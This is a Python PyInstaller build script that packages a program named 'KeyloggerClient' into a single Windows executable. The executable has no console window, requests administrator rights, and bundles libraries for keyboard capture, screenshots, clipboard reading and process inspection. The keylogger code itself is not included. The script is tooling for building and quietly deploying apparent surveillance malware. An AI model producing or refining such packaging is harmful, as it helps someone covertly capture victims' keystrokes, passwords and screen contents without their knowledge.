import PyInstaller.__main__
import os
import shutil

# Build settings
APP_NAME = "KeyloggerClient"
MAIN_SCRIPT = "main.py"
OUTPUT_DIR = "dist"
MANIFEST_FILE = "manifest.xml"
ICON_FILE = None  # Set to .ico file path if you have one (optional)

# Clean previous build
if os.path.exists(OUTPUT_DIR):
    shutil.rmtree(OUTPUT_DIR)

# PyInstaller command
PyInstaller_args = [
    MAIN_SCRIPT,
    f"--name={APP_NAME}",
    "--noconsole",  # No console window
    "--uac-admin",  # Request admin privileges
    f"--add-data={MANIFEST_FILE};.",
    "--onefile",  # Single executable
    "--hidden-import=keyboard",
    "--hidden-import=pyautogui",
    "--hidden-import=psutil",
    "--hidden-import=pyperclip",
    "--hidden-import=PIL",
    "--hidden-import=win32com",
    "--clean",  # Clean cache
    f"--distpath={OUTPUT_DIR}",
]

# Run PyInstaller
PyInstaller.__main__.run(PyInstaller_args)

print(f"Build completed. Executable is in {OUTPUT_DIR}/{APP_NAME}.exe")